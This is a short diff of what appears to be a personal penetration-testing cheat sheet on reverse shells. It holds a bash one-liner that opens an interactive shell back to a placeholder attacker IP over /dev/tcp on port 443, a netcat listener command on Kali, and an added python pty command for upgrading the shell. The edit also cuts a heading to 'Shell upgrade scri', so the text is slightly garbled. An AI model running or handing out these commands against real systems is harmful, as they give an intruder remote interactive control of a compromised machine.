@@ -16,7 +16,9 @@ Reverse Bash Shell
 
   2. Then insert this command where you have rce == 'bash -c "bash -i >& /dev/tcp/<myip>/443 0>&1"'
 
-Shell upgrade script
+Shell upgrade scri
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 1. First set up listener
             kali@kali$ nc -lvnp 443
